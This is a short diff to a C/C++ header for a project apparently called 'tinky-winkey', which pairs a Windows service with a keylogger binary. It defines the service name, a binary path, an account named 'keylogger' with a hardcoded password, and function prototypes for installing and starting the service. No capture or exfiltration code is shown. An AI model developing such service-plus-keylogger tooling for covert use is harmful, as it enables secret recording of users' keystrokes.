@@ -8,10 +8,11 @@
 
 // =============== Magic variables ========== //
 #define USER_NAME ".\\keylogger"
+#define LOCALSYS "keylogger\\LocalSystem"
 #define USER_PASS "docker"
-#define SVC_NAME "tinky"
+#define SVC_NAME TEXT("tinky")
 #define DEF_NAME ""
-#define BINARY_PATH "C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\prog.exe"
+#define BINARY_PATH TEXT("C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\prog.exe")
 // global {
 #define FAILURE 0
 #define SUCCESS 1
@@ -31,5 +32,8 @@ typedef struct tinky {
 // =============== createService.cpp ===============//
 int install(tinky_t *tinky);
 // =============== start.cpp =============== //
-#define BIN_NAME ".\\winkey"
 int start(tinky_t *tinky);
+
+// =============== service control managed =============== //
+#define BIN_NAME ".\\winkey"
+int startedBySCM(tinky_t *tinky);
